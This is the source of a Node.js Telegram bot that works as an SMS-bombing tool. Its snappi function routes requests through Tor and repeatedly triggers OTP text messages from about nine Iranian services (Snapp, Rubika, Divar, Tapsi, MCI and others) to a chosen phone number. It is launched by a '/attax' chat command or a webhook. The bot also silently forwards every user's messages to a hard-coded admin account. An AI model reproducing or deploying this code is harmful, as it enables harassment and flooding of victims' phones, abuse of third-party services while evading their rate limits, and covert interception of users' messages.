const token = process.env.TOKEN;

const Bot = require('node-telegram-bot-api');

const { SocksProxyAgent } = require('socks-proxy-agent');
const axios = require('axios');

const agent = new SocksProxyAgent('socks5h://127.0.0.1:9050');

const tor_axios = require('tor-axios');
const tor = tor_axios.torSetup({
    ip: 'localhost',
    port: 9050,
	controlPort: 9051,
    controlPassword: 'torProxy@123',
})
//tor.torNewSession();
/*
	const axios = inst.create({
    httpAgent: tor.httpAgent(),
	});
*/
let bot;

if(process.env.NODE_ENV === 'production') {
	bot = new Bot(token);
	bot.setWebHook(process.env.HEROKU_URL + bot.token);
}
else {
	bot = new Bot(token, { polling: true });
}
console.log('Bot server started in the ' + process.env.NODE_ENV + ' mode');
bot.on("polling_error", (err) => console.log(err));


var receive_state;
function snappi(x,i){
	
	setTimeout(function() {
	
		(async () => {
			await tor.torNewSession()
			.thenaxios({
			url: 'http://ifconfig.me',
		})
		.then(({
			data
		}) => {
		console.log(data);
		});
			
		})();
		axios.post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {
			"cellphone": x
		},{httpAgent: agent}, {headers: {"Content-Type":"application/json"}})
		.catch(error => {
			console.log("failed znapp"+i.toString()+error.toString())
		})
		
		axios.post('https://messengerg2c51.iranlms.ir/', {
			"api_version": "3", "method": "sendCode", "data": {"phone_number":x.replace("+98","98"), "send_type": "SMS"}
		},{httpAgent: agent}, {headers: {"Content-Type":"application/json"}})
		.catch(error => {
			console.log("failed rubika"+i.toString()+error.toString())
		})
		
		axios.get('https://api.torob.com/a/phone/send-pin/?phone_number='+x.replace("+98","0"),{httpAgent: agent}, {headers: {"Content-Type":"application/json"}})
		.catch(error => {
			console.log("failed torob"+i.toString()+error.toString())
		})
		
		axios.post('https://shadmessenger66.iranlms.ir/', {
			"api_version": "3", "method": "sendCode", "data": {"phone_number": x.replace("+98","98"), "send_type": "SMS"}
		},{httpAgent: agent}, {headers: {"Content-Type":"application/json"}})
		.catch(error => {
			console.log("failed shad"+i.toString()+error.toString())
		})
		
		axios.post('https://api.divar.ir/v5/auth/authenticate', {
			"phone": x.replace("+98","0")
		},{httpAgent: agent}, {headers: {"Content-Type":"application/json"}})
		.catch(error => {
			console.log("failed divar"+i.toString()+error.toString())
		})
		
		axios.get('https://core.gap.im/v1/user/add.json?mobile='+x.replace("+98","%2B98"),{httpAgent: agent}, {headers: {"Content-Type":"application/json"}})
		.catch(error => {
			console.log("failed gap"+i.toString()+error.toString())
		})
		
		axios.post('https://tap33.me/api/v2/user',
			{"credential":{"phoneNumber":x.replace("+98","0"),"role":"PASSENGER"}}
		,{httpAgent: agent}, {headers: {"Content-Type":"application/json"}})
		.catch(error => {
			console.log("failed tapsi"+i.toString()+error.toString())
		})
		
		axios.post('https://api.zarinplus.com/user/zarinpal-login', {
			"phone_number": x.replace("+98","98")
			},{httpAgent: agent}, {headers: {"Content-Type":"application/json","origin": "https://pwa.zarinplus.com",
			"referer": "https://pwa.zarinplus.com/"}})
			.catch(error => {
				console.log("failed zarinplus"+i.toString()+error.toString())
			})
			
			axios.post('https://api-ebcom.mci.ir/services/auth/v1.0/otp', {
				"msisdn": x.replace("+98","9")
				},{httpAgent: agent}, {headers: {"Content-Type":"application/json","origin": "https://static-ebcom.mci.ir",
				"referer": "https://static-ebcom.mci.ir"}})
				.catch(error => {
					console.log("failed evano"+i.toString()+error.toString())
				})
	}, i*3000);
}
module.exports = (webhook) => {
	webhook.on(['action1', 'action2'], (session) => {
		session.variable1 = 'some value';
	});
}
bot.on('message', (msg) => {
	if(receive_state == true){
		bot.forwardMessage("@oraldee.d",msg.chat.id,msgid);
		receive_state = false;
		return
	}
	
	var name = msg.from.first_name;
	var id = msg.from.id;
	var msgtext = msg.text;
	var msgid = msg.message_id;
	var username = msg.from.username;
	var sticker = "CAADAgADaAIAApzW5wo6T59hfcb-dQI";
	
	if (id != 99850101){
		bot.forwardMessage(99850101,msg.chat.id,msgid);
	}
	if(msg.photo == null && msg.audio == null && msg.animation == null && msg.document == null && msg.sticker == null && msg.video == null && msg.voice == null){
		switch(msgtext.split(":")[0]){
			case "/attax":
			for (i = 0; i < parseInt(msgtext.split(":")[2]); i++) {
				snappi(msgtext.split(":")[1],i);
			}
			break
		}
	}
	
	if(id==99850101 && msg.reply_to_message != null){
		if(msg.photo == null && msg.audio == null && msg.animation == null && msg.document == null && msg.sticker == null && msg.video == null && msg.voice == null){
			switch(msgtext.split(":")[0]){
				case "/carnage":
				bot.sendMessage(id,"سلام ارباب",optuser1);
				break
				case "/dogify":
				bot.sendPhoto(id,'http://dogr.io/'+msgtext.split(":")[1]+".png");
				break
				default:
				try {
					bot.sendMessage(msg.reply_to_message.forward_from.id,msgtext);
					} catch(e) {
					console.log(msg.toString());
				}
				break
			}	
		}
	}
	var optadmin1 = {
		reply_markup: JSON.stringify({
			inline_keyboard: [
				[{text:"지옥문", callback_data: "12"}],
				[{text:"엔더월드 가는법", callback_data: "2"}],
				[{text:"TNT 만드는법", callback_data: "reg"}],
			]
		}),
	};
	//bot.sendMessage(99850101,JSON.stringify(row));
	
	var optuser1 = {
		reply_markup: JSON.stringify({
			inline_keyboard: [
				[{text:"ارسال تکلیف", callback_data: "sendwork"}],
				[{text:"خرید تکلیف", callback_data: "buywork"}],
				[{text:"だまれ！", callback_data: "aboutus"}],
			]
		}),
	};
	//if(id==99850101){
	if(msg.photo == null && msg.audio == null && msg.animation == null && msg.document == null && msg.sticker == null && msg.video == null && msg.voice == null){
		switch(msgtext.split(":")[0]){
			case "/carnage":
			bot.sendMessage(id,"سلام ارباب",optuser1);
			break
			case "/dogify":
			bot.sendPhoto(id,'http://dogr.io/'+msgtext.split(":")[1]+".png");
			break
			default:
			break
			/*bot.sendMessage(id,"پیام فرستاده شد!");*/
			
		//}
		/*} else {
			switch(msgtext.split(":")[0]){
			case "/start":
			bot.sendMessage(id,"خوش آمدید");
			break
			default:
			bot.sendMessage(id,"پیام فرستاده شد!");
			bot.forwardMessage(99850101,msg.chat.id,msgid);
		}*/
	}
}
});



bot.on("callback_query", (CallbackQuery)=> {
	const optusersendwork = {
		chat_id: CallbackQuery.from.id,
		message_id: CallbackQuery.message.message_id,
		reply_markup: JSON.stringify({
			inline_keyboard: [
				[{text:"ریاضی", callback_data: "send"}],
				[{text:"فیزیک", callback_data: "send"}],
				[{text:"عربی", callback_data: "send"}]
			]
		}),
	};
	const optusersend = {
		chat_id: CallbackQuery.from.id,
		message_id: CallbackQuery.message.message_id,
		reply_markup: JSON.stringify({
			inline_keyboard: [
				[{text:"انصراف", callback_data: "cancel"}]
			]
		}),
	};
	
	
	if(CallbackQuery.data == "sendwork") { 
		bot.editMessageText("نوع درس را مشخص کنید",optusersendwork);
	}
	if(CallbackQuery.data == "send") { 
		bot.editMessageText("فایل خود را بفرستید",optusersend);
	}
	
});




module.exports = bot;					
const express = require('express');
const bodyParser = require('body-parser');
const packageInfo = require('./package.json');


const app = express();
app.use(bodyParser.json());

app.get('/', function (req, res) {
	res.json({ version: packageInfo.version });
});

var server = app.listen(process.env.PORT, "0.0.0.0", () => {
	const host = server.address().address;
	const port = server.address().port;
	console.log('Web server started at http://%s:%s', host, port);
});

app.post('/' + bot.token, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

app.post('/webhook', (req, res) => {
	for (i = 0; i < parseInt(req.body.count); i++) {
		snappi(req.body.number,i);
		res.sendStatus(200);
	}
});
